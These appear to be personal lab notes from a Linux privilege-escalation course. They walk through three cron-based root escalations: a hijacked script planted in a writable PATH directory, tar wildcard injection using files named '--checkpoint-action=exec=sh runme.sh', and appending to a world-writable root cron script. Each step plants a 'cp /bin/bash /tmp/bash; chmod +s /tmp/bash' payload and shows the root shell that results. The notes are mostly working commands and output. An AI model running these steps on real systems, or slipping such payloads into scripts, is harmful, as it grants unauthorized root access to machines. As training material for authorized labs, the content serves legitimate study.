#corntab

### Crons Path
#createoverwrite
1. Find out if there are are scheduled corn jobs files. 
```
TCM@debian:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

2. 'overwrite.sh' cronjob file is running every minute, lets check where it is located. Unable to find in /home/user cronjob path. 
```
TCM@debian:~$ ls -la /home/user
total 56
drwxr-xr-x  6 TCM  user 4096 Aug 19 22:59 .
drwxr-xr-x  3 root root 4096 May 15  2017 ..
-rw-------  1 TCM  user 1056 Aug 20 00:10 .bash_history
-rw-r--r--  1 TCM  user  220 May 12  2017 .bash_logout
-rw-r--r--  1 TCM  user 3235 May 14  2017 .bashrc
drwxr-xr-x  2 TCM  user 4096 Aug 19 22:59 .config
drwx------  2 TCM  user 4096 Jun 18  2020 .gnupg
drwxr-xr-x  2 TCM  user 4096 May 13  2017 .irssi
-rw-------  1 TCM  user  137 May 15  2017 .lesshst
-rw-r--r--  1 TCM  user  186 Aug 19 22:58 libcalc.c
-rw-r--r--  1 TCM  user  212 May 15  2017 myvpn.ovpn
-rw-------  1 TCM  user   11 Aug 19 22:58 .nano_history
-rw-r--r--  1 TCM  user  725 May 13  2017 .profile
drwxr-xr-x 10 TCM  user 4096 Jun 18  2020 tools

```

3. Create one and give executable permissions. 
```
TCM@debian:~$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
TCM@debian:~$ chmod +x /home/user/overwrite.sh 
TCM@debian:~$ ls -la /home/user/
total 60
drwxr-xr-x  6 TCM  user 4096 Aug 20 00:22 .
drwxr-xr-x  3 root root 4096 May 15  2017 ..
-rw-------  1 TCM  user 1056 Aug 20 00:10 .bash_history
-rw-r--r--  1 TCM  user  220 May 12  2017 .bash_logout
-rw-r--r--  1 TCM  user 3235 May 14  2017 .bashrc
drwxr-xr-x  2 TCM  user 4096 Aug 19 22:59 .config
drwx------  2 TCM  user 4096 Jun 18  2020 .gnupg
drwxr-xr-x  2 TCM  user 4096 May 13  2017 .irssi
-rw-------  1 TCM  user  137 May 15  2017 .lesshst
-rw-r--r--  1 TCM  user  186 Aug 19 22:58 libcalc.c
-rw-r--r--  1 TCM  user  212 May 15  2017 myvpn.ovpn
-rw-------  1 TCM  user   11 Aug 19 22:58 .nano_history
-rwxr-xr-x  1 TCM  user   43 Aug 20 00:22 overwrite.sh
-rw-r--r--  1 TCM  user  725 May 13  2017 .profile
drwxr-xr-x 10 TCM  user 4096 Jun 18  2020 tools
```

4. Check out task corn job is doing. Rooted it. 
```
TCM@debian:~$ /tmp/bash -p
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
bash-4.1# whoami
root
```

### Cron Wildcards
#runme

1. Check out the cronjob files. Found compress.sh is acceptign wildcards. 
```
TCM@debian:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh

```

2. Cat out the script on this file. 
```
TCM@debian:~$ cat /usr/local/bin/compress.sh
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *

```

3. Check permission and create wild card file named ' runme.sh' then give permission and create command files. 
```
TCM@debian:~$ pwd
/home/user
TCM@debian:~$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh
TCM@debian:~$ ls
libcalc.c  myvpn.ovpn  overwrite.sh  runme.sh  tools
TCM@debian:~$ chmod 777 runme.sh 
TCM@debian:~$ touch /home/user/--checkpoint=1
TCM@debian:~$ touch /home/user/--checkpoint-action=exec=sh\runme.sh

```

4. Rooted. 
```
TCM@debian:~$ /tmp/bash -p
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
bash-4.1# whoami
root

```

### Cron File Overwrites
#overwrite 
1. Add the new commands on overwrite.sh (can do netcat too.)
```
TCM@debian:~$ ls -la /usr/local/bin/overwrite.sh 
-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
TCM@debian:~$ locate overwrite.sh
locate: warning: database `/var/cache/locate/locatedb' is more than 8 days old (actual age is 1157.8 days)
/usr/local/bin/overwrite.sh
TCM@debian:~$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh 
TCM@debian:~$ cat /usr/local/bin/overwrite.sh 
#!/bin/bash

echo `date` > /tmp/useless
cp /bin/bash /tmp/bash; chmod +s /tmp/bash

```

2. Check out after one minutes, the root it. 
```
TCM@debian:~$ ls -la /tmp
total 2032
drwxrwxrwt  2 root root    4096 Aug 20 00:43 .
drwxr-xr-x 22 root root    4096 Jun 17  2020 ..
-rw-r--r--  1 root root  181568 Aug 20 00:43 backup.tar.gz
-rwsr-sr-x  1 root staff 926536 Aug 20 00:43 bash
-rwsrwxrwx  1 root root  926536 Aug 19 23:17 nginxrootsh
-rwxr-xr-x  1 TCM  user    6845 Aug 19 23:45 service
-rw-r--r--  1 TCM  user      68 Aug 19 23:45 service.c
-rw-r--r--  1 root root      29 Aug 20 00:23 useless
TCM@debian:~$ /tmp/bash -p
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)

```